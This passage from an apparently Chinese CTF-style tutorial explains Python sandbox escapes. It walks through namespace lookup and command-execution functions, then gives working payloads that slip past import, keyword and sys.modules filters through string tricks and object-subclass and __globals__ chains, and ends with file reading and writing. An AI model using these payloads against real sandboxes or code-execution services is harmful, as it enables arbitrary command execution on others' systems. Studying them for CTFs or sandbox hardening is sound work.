print(&#x27;enclosing function locals &#x27;, x)</span><br><span class="line">foo()</span><br><span class="line">print(&#x27;global &#x27;, x)</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">locals  3</span><br><span class="line">enclosing function locals  2</span><br><span class="line">global  1</span><br><span class="line"></span><br><span class="line">注释x = 3后</span><br><span class="line">locals  2</span><br><span class="line">enclosing function locals  2</span><br><span class="line">global  1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def innerfoo()				Local即函数内部命名空间；</span><br><span class="line">def foo()					Enclosing function locals外部嵌套函数的名字空间</span><br><span class="line">module(文件本身)			 Global(module)函数定义所在模块（文件）的名字空间</span><br><span class="line">Python内置模块的名字空间 	  Builtin</span><br></pre></td></tr></table></figure>

<p>如果某个变量名称与对象之间的映射在局部(Local)中没有找到，接下来就会在函数内部再次定义一个函数(Enclosed)进行搜索，如果函数内部再次定义一个函数也没有找到，然后就会到全局(Global)命名空间中进行查找，最后会在内建(Built-in)命名空间搜索（注：如果一个名称在所有命名空间中都没有找到，就会产生一个NameError）。</p>
<h3 id="命令执行的函数"><a href="#命令执行的函数" class="headerlink" title="命令执行的函数"></a>命令执行的函数</h3><p>python支持命令执行的方式有下面几个例子</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">eval			#eval(&#x27;__import__(&quot;os&quot;).system(&quot;dir&quot;)&#x27;)</span><br><span class="line">os				#os.system(“dir”)或者os.popen(&#x27;whoami&#x27;).read()</span><br><span class="line">commands		#仅限python2.x</span><br><span class="line">subprocess		#subprocess.run(&#x27;whoami&#x27;)</span><br><span class="line">timeit			#timeit.timeit(&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;, number=1)</span><br><span class="line">platform		#platform.popen(&#x27;whoami&#x27;).read()		#python2写法，python3无效</span><br><span class="line">pty				#pty.spawn(&#x27;ls&#x27;)						#window无效</span><br><span class="line">bdb、cgi等等还有其他的方式</span><br></pre></td></tr></table></figure>

<h3 id="花里胡哨的姿势"><a href="#花里胡哨的姿势" class="headerlink" title="花里胡哨的姿势"></a>花里胡哨的姿势</h3><h4 id="花式import"><a href="#花式import" class="headerlink" title="花式import"></a>花式import</h4><p>首先可以知道常用的是import os，虽然可以直接过滤import os，但是可以通过import    os中间添加空格绕过，如果空格也被过滤了，可以使用下面的方式绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">importlib.import_module(&#x27;os&#x27;).system(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure>

<p>而且可以知道import其本质就是把一个库导入，这样我们可以用with或者execfile等函数可以把文件打开但是需要知道文件的路径。</p>
<p>如果可以用sys可以看下面可以方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">print(sys.path)</span><br></pre></td></tr></table></figure>

<p>sys.path是python的搜索模块的路径集，是一个list， sys.path 变量的初始值来自：</p>
<ul>
<li>输入脚本的目录（当前目录）。</li>
<li>环境变量 PYTHONPATH 表示的目录列表中搜索(这和 shell 变量 PATH 具有一样的语法，即一系列目录名的列表)。</li>
<li>Python 默认安装路径中搜索。<br> 实际上，解释器由 sys.path 变量指定的路径目录搜索模块，该变量初始化时默认包含了输入脚本（或者当前目录）， PYTHONPATH 和安装目录。这样就允许 Python程序了解如何修改或替换模块搜索目录。</li>
</ul>
<p>轻量级的文件查找</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">a=input(&#x27;请输入想要查找的磁盘：&#x27;)+&#x27;:/&#x27;</span><br><span class="line">b=input(&#x27;请输入想要查找的文件名和后缀：&#x27;)#os.py</span><br><span class="line">for root,dirs,files in os.walk(a,topdown=True):</span><br><span class="line">    if b in files:</span><br><span class="line">        print(root)</span><br><span class="line">        continue</span><br><span class="line">    else:</span><br><span class="line">        pass</span><br><span class="line">print(&quot;查找完毕&quot;)</span><br></pre></td></tr></table></figure>

<p>绕过import</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">importlib.import_module(&#x27;os&#x27;).system(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">with open(r&quot;C:\Users\30261\new\python\python3.9\Lib\site-packages\gevent\os.py&quot;,&#x27;r&#x27;) as f:</span><br><span class="line">    exec(f.read())</span><br><span class="line">system(&#x27;whoami&#x27;)</span><br><span class="line">#此方法需要知道os.py的路径，python2和python3都可以支持</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">execfile(r&#x27;C:\Users\30261\new\python\python3.9\Lib\site-packages\gevent\os.py&#x27;)</span><br><span class="line">system(&#x27;whoami&#x27;)</span><br><span class="line">##此方法需要知道os.py的路径，execfile仅支持python2，python3没有这个函数</span><br></pre></td></tr></table></figure>

<h4 id="花式处理字符串"><a href="#花式处理字符串" class="headerlink" title="花式处理字符串"></a>花式处理字符串</h4><p>代码中要是出现 os，直接不让运行。那么可以利用字符串的各种变化来引入 os：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(__import__(&#x27;so&#x27;[::-1]).system(&#x27;whoami&#x27;))						#逆序</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a,b=&#x27;o&#x27;,&#x27;s&#x27;</span><br><span class="line">print(__import__(a+b).system(&#x27;whoami&#x27;))								#变量拼接</span><br></pre></td></tr></table></figure>

<p>也可以使用eval、exec 都是相当危险的函数，exec 比 eval 还要危险</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(eval(&#x27;)&quot;imaohw&quot;(metsys.)&quot;so&quot;(__tropmi__&#x27;[::-1]))				#eval绕过</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(exec(&#x27;)&quot;imaohw&quot;(metsys.so ;so tropmi&#x27;[::-1]))					#exec绕过</span><br></pre></td></tr></table></figure>

<p>上面提到了逆序、变量拼接，同样也可以使用base64、hex、rot13等其他方式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(__import__(&#x27;b3M=&#x27;.decode(&#x27;base64&#x27;)).system(&#x27;whoami&#x27;))			#base64绕过，python2</span><br></pre></td></tr></table></figure>

<h4 id="绕过sys-modules"><a href="#绕过sys-modules" class="headerlink" title="绕过sys.modules"></a>绕过sys.modules</h4><p>sys.modules是一个全局字典，该字典是python启动后就加载在内存中。每当程序员导入新的模块，sys.modules都将记录这些模块。字典sys.modules对于加载模块起到了缓冲的作用。</p>
<p>当某个模块第一次导入，字典sys.modules将自动记录该模块。当第二次再导入该模块时，python会直接到字典中查找，从而加快了程序运行的速度。字典sys.modules具有字典所拥有的一切方法，可以通过这些方法了解当前的环境加载了哪些模块</p>
<p>有些库例如 os是默认被加载进来的，但是不能直接使用，原因在于sys.modules中未经import加载的模块对当前空间是不可见的。</p>
<p>如果将 os 从 sys.modules 中剔除，os 就彻底没法用了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">sys.modules[&#x27;os&#x27;] = &#x27;not allowed&#x27;</span><br><span class="line">import os</span><br><span class="line">os.system(&#x27;whoami&#x27;)		#报错AttributeError: &#x27;str&#x27; object has no attribute &#x27;system&#x27;</span><br></pre></td></tr></table></figure>

<p>此处这里不能用 <code>del sys.modules[&#39;os&#39;]</code>，因为当import一个模块时：import A，检查 sys.modules 中是否已经有A，如果有则不加载，如果没有则为A创建 module 对象，并加载 A。所以删了 <code>sys.modules[&#39;os&#39;]</code> 只会让 Python 重新加载一次 os。<br>然后针对上面的方法的绕过方式为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">sys.modules[&#x27;os&#x27;] = &#x27;not allowed&#x27;</span><br><span class="line">del sys.modules[&#x27;os&#x27;]</span><br><span class="line">import os</span><br><span class="line">os.system(&#x27;whoami&#x27;)				#绕过成功</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">同时也可以使用__builtins__绕过：</span><br><span class="line">print(__builtins__.__dict__[&#x27;__import__&#x27;](&#x27;os&#x27;).system(&#x27;whoami&#x27;))</span><br><span class="line">getattr(getattr(__builtins__, &#x27;__tropmi__&#x27;[::-1])(&#x27;so&#x27;[::-1]), &#x27;metsys&#x27;[::-1])(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure>

<h4 id="花式执行函数"><a href="#花式执行函数" class="headerlink" title="花式执行函数"></a>花式执行函数</h4><p>通过上面内容我们很容易发现，引入 os 只不过是第一步，如果把 system 这个函数干掉，也没法通过os.system执行系统命令，并且这里的system也不是字符串，也没法直接做编码等等操作。比如直接去os.py直接把system函数删掉或者直接过滤system函数</p>
<p>通过上面命令执行的函数列表可以知道可以通过，下面等多种方式绕过：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(os.popen(&#x27;whoami&#x27;).read())</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(timeit.timeit(&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;, number=1))</span><br></pre></td></tr></table></figure>

<p>或者可以使用getattr 拿到对象的方法、属性</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">getattr(os, &#x27;metsys&#x27;[::-1])(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure>

<p>不用import的绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(getattr(__builtins__, &#x27;__tropmi__&#x27;[::-1])(&#x27;so&#x27;[::-1]), &#x27;metsys&#x27;[::-1])(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">与 getattr 相似的还有 __getattr__、__getattribute__，它们自己的区别就是getattr相当于class.attr，都是获取类属性/方法的一种方式，在获取的时候会触发__getattribute__，如果__getattribute__找不到，则触发__getattr__，找不到则报错。</span><br></pre></td></tr></table></figure>

<h4 id="继承关系逃逸"><a href="#继承关系逃逸" class="headerlink" title="继承关系逃逸"></a>继承关系逃逸</h4><p>Python类是支持（多）继承的，一个类的方法和属性可能定义在当前类，也可能定义在基类。针对这种情况，当调用类方法或类属性时，就需要对当前类以及它的基类进行搜索，以确定方法或属性的位置，而搜索的顺序就称为方法解析顺序。</p>
<p>方法解析顺序（Method Resolution Order），简称 MRO。对于只支持单继承的编程语言来说，MRO 很简单，就是从当前类开始，逐个搜索它的父类；而对于 Python，它支持多继承，MRO 相对会复杂一些。</p>
<p>实际上，Python 发展至今，经历了以下 3 种 MRO 算法，分别是：</p>
<ul>
<li><p>自左向右的深度优先搜索算法</p>
</li>
<li><p>自左向右的广度优先搜索算法</p>
</li>
<li><p>自 Python 2.3 版本，对新式类采用了 C3 算法。由于 Python 3.x 仅支持新式类，所以该版本只使用 C3 算法。</p>
</li>
</ul>
<p>2.2 之前是经典类，搜索是深度优先；经典类后来发展为新式类，使用广度优先搜索，再后来新式类的搜索变为 C3 算法；而 Python 3.x 仅支持新式类，所以该版本只使用 C3 算法。</p>
<p>MRO就是方法解析顺序，因为 Python 支持多重继承，所以就必须有个方式判断某个方法到底是 A 的还是 B 的。虽然判断继承方式不太合理，但是python的新式类都有个属性，叫<code>__mro__</code>，是个元组，记录了继承关系：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python支持多重继承，在解析父类的__init__时，定义解析顺序的是子类的__mro__属性，内容为一个存储要解析类顺序的元组。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#__class__功能和type()函数一样，都是查看对象所在的类。并且__class__可以套用</span><br><span class="line">print(&#x27;&#x27;.__class__.__mro__)			#(&lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)		#&#x27;&#x27;属于str类，它继承了object类</span><br><span class="line">print(().__class__.__mro__)			#(&lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)	#()属于tuple类，它继承了object类</span><br></pre></td></tr></table></figure>

<p>类的实例在获取 <code>__class__</code> 属性时会指向该实例对应的类。可以看到，<code>&#39;&#39;</code>属于 <code>str</code>类，它继承了 <code>object</code> 类，这个类是所有类的超类。具有相同功能的还有<code>__base__</code>和<code>__bases__</code>。需要注意的是，经典类需要指明继承 object 才会继承它，否则是不会继承的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#__bases__和__bases__都是内置函数， 用来查看类的继承关系</span><br><span class="line">class test:</span><br><span class="line">    pass</span><br><span class="line">print(test.__base__,&#x27;\t&#x27;,test.__bases__)			#&lt;class &#x27;object&#x27;&gt; 	 (&lt;class &#x27;object&#x27;&gt;,)</span><br></pre></td></tr></table></figure>

<p>由于没法直接引入 os，那么假如有个库叫<code>oos</code>，在<code>oos</code>中引入了<code>os</code>，那么我们就可以通过<code>__globals__</code>拿到 os（<code>__globals__</code>是函数所在的全局命名空间中所定义的全局变量）。例如，<code>site</code> 这个库就有 <code>os</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import site</span><br><span class="line">print(site.os)			#&lt;module &#x27;os&#x27; from &#x27;C:\\Users\\30261\\new\\python\\python3.9\\lib\\os.py&#x27;&gt;</span><br></pre></td></tr></table></figure>

<p>可以在site中看到import os字样，也就是说，能引入site的话，就相当于有 os。</p>
<p>那如果site也被禁用了呢？可以利用 <code>reload</code>，变相加载 <code>os</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import site</span><br><span class="line"></span><br><span class="line"># print(os)				#报错</span><br><span class="line">os=reload(site.os)</span><br><span class="line">print(os.system(&quot;whoami&quot;))</span><br></pre></td></tr></table></figure>

<p>同时可以看到所有的类都继承了<code>object</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()</span><br><span class="line">从代码上我们比较好理解，就是从()找到它的父类也就是__bases__[0]，而这个父类就是Python中的根类&lt;type &#x27;object&#x27;&gt;，它里面有很多的子类，包括file等，这些子类中就有跟os、system等相关的方法，所以，我们可以从这些子类中找到自己需要的方法。</span><br></pre></td></tr></table></figure>

<p>那么我们先用<code>__subclasses__</code>看看<code>object</code>的子类，以 2.x 为例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">print(().__class__.__mro__[-1].__subclasses__())</span><br><span class="line"></span><br><span class="line">for i in enumerate(().__class__.__mro__[-1].__subclasses__()):print(i)</span><br><span class="line">#(136, &lt;class &#x27;_sitebuiltins.Quitter&#x27;&gt;)(137, &lt;class &#x27;_sitebuiltins._Printer&#x27;&gt;)			#python3结果</span><br><span class="line">#(72, &lt;class &#x27;site._Printer&#x27;&gt;)(73, &lt;class &#x27;site._Helper&#x27;&gt;)								#python2结果</span><br><span class="line">#enumerate() 函数用于将一个可遍历的数据对象(如列表、元组或字符串)组合为一个索引序列，同时列出数据和数据下标，</span><br></pre></td></tr></table></figure>

<p>可以看到，site 就在里面，以 python2.7 的<code>site._Printer</code>为例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(().__class__.__mro__[-1].__subclasses__()[72]._Printer__setup.__globals__[&#x27;os&#x27;])</span><br><span class="line">#&lt;module &#x27;os&#x27; from &#x27;C:\Users\30261\new\python\python2.7\lib\os.pyc&#x27;&gt;					#python2结果</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(dir(().__class__.__mro__[-1].__subclasses__()[72]))</span><br><span class="line">#可以看到_Printer__setup属性</span><br></pre></td></tr></table></figure>

<p>可以看到同样也能得到os.pyc。同时在 site 中还有 <code>__builtins__</code></p>
<p>这个方法不仅限于 A-&gt;os，还阔以是 A-&gt;B-&gt;os，比如 2.x 中的 <code>warnings</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import warnings</span><br><span class="line">#print(warnings.os)					#报错</span><br><span class="line">print(warnings.linecache)		#&lt;module &#x27;linecache&#x27; from &#x27;\python2.7\lib\linecache.pyc&#x27;&gt;</span><br><span class="line">print(warnings.linecache.os)	#&lt;module &#x27;os&#x27; from &#x27;C:\Users\30261\new\python\python2.7\lib\os.pyc&#x27;&gt;</span><br></pre></td></tr></table></figure>

<p>然后化简一下继承链</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># print(().__class__.__mro__[-1].__subclasses__())</span><br><span class="line"># print(dir(().__class__.__mro__[-1].__subclasses__()[59]))</span><br><span class="line"># print(().__class__.__mro__[-1].__subclasses__()[59].__init__)</span><br><span class="line"># print(().__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;])</span><br><span class="line"># print(().__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__[&#x27;os&#x27;])</span><br><span class="line">print(().__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__[&#x27;os&#x27;].system(&#x27;whoami&#x27;))</span><br></pre></td></tr></table></figure>

<p>同时在<code>warnings</code>这个库中有个函数：<code>warnings.catch_warnings</code>，它有个<code>_module</code>属性</p>
<p><img src="/image/media/2022/python/1.png"></p>
<p>所以通过<code>_module</code>也可以构造 payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(().__class__.__mro__[-1].__subclasses__()[60]()._module.linecache.os.system(&#x27;whoami&#x27;))</span><br></pre></td></tr></table></figure>

<p>或者也可以利用循环来自动寻找</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[x for x in ().__class__.__base__.__subclasses__() if x.__name__ == &#x27;catch_warnings&#x27;][0]()._module.linecache.os.system(&#x27;whoami&#x27;)</span><br><span class="line"></span><br><span class="line">[x for x in ().__class__.__mro__[-1].__subclasses__() if x.__name__ == &#x27;catch_warnings&#x27;][0]()._module.linecache.os.system(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure>

<p>3.x 中的<code>warnings</code>虽然没有 <code>linecache</code>，也有<code>__builtins__</code>。</p>
<p>同样，py3.x 中有<code>&lt;class &#39;os._wrap_close&#39;&gt;</code>，利用方式可以为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># print(().__class__.__mro__[-1].__subclasses__())</span><br><span class="line"># print(().__class__.__mro__[-1].__subclasses__()[134])</span><br><span class="line"># print(dir(().__class__.__mro__[-1].__subclasses__()[134].__init__.__globals__))</span><br><span class="line"># print(().__class__.__mro__[-1].__subclasses__()[134].__init__)</span><br><span class="line"># print(().__class__.__mro__[-1].__subclasses__()[134].__init__.__globals__)</span><br><span class="line"># print(().__class__.__mro__[-1].__subclasses__()[134].__init__.__globals__[&#x27;system&#x27;])</span><br><span class="line">print(().__class__.__mro__[-1].__subclasses__()[134].__init__.__globals__[&#x27;system&#x27;](&quot;whoami&quot;))</span><br></pre></td></tr></table></figure>

<p>可以看到前面几个利用方式前面的部分片段都是一样的，都是用<code>().__class__.__mro__[-1]</code>去定位&lt;class ‘object’&gt;，所以可以简化为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print(object.__subclasses__()[60]()._module.linecache.os.system(&#x27;whoami&#x27;))			#python2</span><br><span class="line"></span><br><span class="line">print(object.__subclasses__()[134].__init__.__globals__[&#x27;system&#x27;](&quot;whoami&quot;))		#python3</span><br></pre></td></tr></table></figure>

<p>还有一种就是利用<code>builtin_function_or_method</code> 的 <code>__call__</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">for i in enumerate(().__class__.__mro__[-1].__subclasses__()):print(i)</span><br><span class="line">#(37, &lt;class &#x27;builtin_function_or_method&#x27;&gt;)</span><br><span class="line"># print(().__class__.__mro__[-1].__subclasses__())</span><br><span class="line"># print(().__class__.__mro__[-1].__subclasses__()[37])</span><br><span class="line"># print(dir(().__class__.__mro__[-1].__subclasses__()[37].__call__))</span><br><span class="line">print(().__class__.__mro__[-1].__subclasses__()[37].__call__(eval, &#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;))</span><br></pre></td></tr></table></figure>

<p>同样可以化简为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print(object.__subclasses__()[37].__call__(eval, &#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;))</span><br><span class="line"></span><br><span class="line">print([].__getattribute__(&#x27;append&#x27;).__class__.__call__(eval, &#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;))</span><br></pre></td></tr></table></figure>

<p>还有就是利用定义类调用super</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class test(dict):</span><br><span class="line">    def __init__(self):</span><br><span class="line">    	#python2</span><br><span class="line">        print(super(test, self).keys.__class__.__call__(eval, &#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;))</span><br><span class="line">        #如果是 3.x 的话可以简写为：</span><br><span class="line">        print(super().keys.__class__.__call__(eval, &#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;))</span><br><span class="line">        # super().keys.__class__.__call__(eval, &#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;))</span><br><span class="line">test()</span><br></pre></td></tr></table></figure>

<p>还有一些比较奇特的payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27; ))						#python2</span><br><span class="line">print(().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&#x27;func_global&#x27;+&#x27;s&#x27;)[&#x27;linecache&#x27;].__dict__[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;popen&#x27;](&#x27;who&#x27;+&#x27;ami&#x27;).read())		#变体</span><br></pre></td></tr></table></figure>

<ul>
<li>总结</li>
</ul>
<p>首先就是通过<code>__class__</code>、<code>__mro__</code>、<code>__subclasses__</code>、<code>__bases__</code>等等属性/方法去获取 <code>object</code>，</p>
<p>再根据<code>__globals__</code>找引入的<code>__builtins__</code>或者<code>eval</code>等等能够直接被利用的库，</p>
<p>或者找到<code>builtin_function_or_method</code>类/类型<code>__call__</code>后直接运行<code>eval</code>。</p>
<h3 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h3><p>读文件常用用到的方法有open、read、readline、readlines、write、file（python2）</p>
<p>还有一些不太常用<code>types.FileType</code>(rw)、<code>platform.popen</code>(rw)、<code>linecache.getlines</code>(r)</p>
<h4 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h4><p>危害不大，主要就是可以用来读flag之类的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">print(file(&quot;filename&quot;).read())</span><br><span class="line">或者</span><br><span class="line">import types</span><br><span class="line">print(types.FileType(&quot;filename&quot;).read())</span><br><span class="line">或者</span><br><span class="line">with open(&quot;C:\Windows\win.ini&quot;) as f :print(f.readlines())</span><br><span class="line">或者</span><br><span class="line">print(().__class__.__bases__[0].__subclasses__()[40](&#x27;filename&#x27;).read())		#python2</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>读文件暂时没什么发现特别的地方。</p>
<h4 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h4><p>危害比较大因为如果可以写进入，然后就能被调用或者输出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">file(&#x27;filename&#x27;, &#x27;w&#x27;).write(&#x27;写入的内容&#x27;)</span><br><span class="line">或者</span><br><span class="line">test.py:</span><br><span class="line">import os</span><br><span class="line">print(os.system(&#x27;whoami&#x27;))</span><br><span class="line">然后在另一个文件中执行import test就能执行命令了</span><br><span class="line">或者</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[40](&#x27;filename&#x27;, &#x27;w&#x27;).write(&#x27;写入的内容&#x27;)#python2</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里需要注意的是，这里 py 文件命名是有技巧的。</p>
<p>之所以要挑一个常用的标准库是因为过滤库名可能采用的是白名单。并且之前说过有些库是在<code>sys.modules</code>中有的，这些库无法这样利用，会直接从<code>sys.modules</code>中加入，比如<code>re</code>：</p>
<p>由于待测试的库中有个叫 <code>test</code>的，如果把遍历测试的文件也命名为 test，会导致那个文件运行 2 次，因为自己 import 了自己。</p>
<p>剩下的就是根据上面的执行系统命令采用的绕过方法去寻找 payload 了，比如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import test</span><br><span class="line">print(__builtins__.open(test).read())</span><br><span class="line">或者</span><br><span class="line">().__class__.__base__.__subclasses__()[40](&#x27;key&#x27;).read()</span><br></pre></td></tr></table></figure>

<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><ul>
<li>过滤<code>[</code>和<code>]</code></li>
</ul>
